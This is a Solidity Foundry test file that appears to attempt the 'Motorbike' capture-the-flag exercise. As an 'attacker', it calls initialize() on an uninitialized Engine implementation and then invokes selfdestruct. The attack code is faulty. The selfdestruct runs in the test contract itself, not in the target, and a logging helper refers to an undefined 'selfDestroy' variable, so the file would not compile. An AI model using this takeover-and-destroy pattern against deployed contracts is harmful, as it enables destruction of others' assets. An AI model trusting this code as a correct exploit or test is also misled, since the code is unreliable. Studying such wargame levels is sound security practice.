import {Test, console} from "forge-std/Test.sol";
import {Engine, Motorbike} from "../src/Motorbike.sol";

contract MotorbikeTest is Test {
    Engine engine;
    Motorbike motorbike;

    address attacker = makeAddr("attacker");

    function setUp() public {
        engine = new Engine();
        motorbike = new Motorbike(address(engine));
    }

    function testAttack() public {
        vm.startPrank(attacker);
        engine.initialize();
        destroyMotorbike();
        vm.stopPrank();
    }

    function destroyMotorbike() public {
        selfdestruct(payable(msg.sender));
    }

    function _logAddress() internal {
        console.log("--------------------------------");
        console.log("address(this)", address(this));
        console.log("address(attacker)", address(attacker));
        console.log("address(engine)", address(engine));
        console.log("address(motorbike)", address(motorbike));
        console.log("address(selfDestroy)", address(selfDestroy));
        console.log("--------------------------------");
    }
}
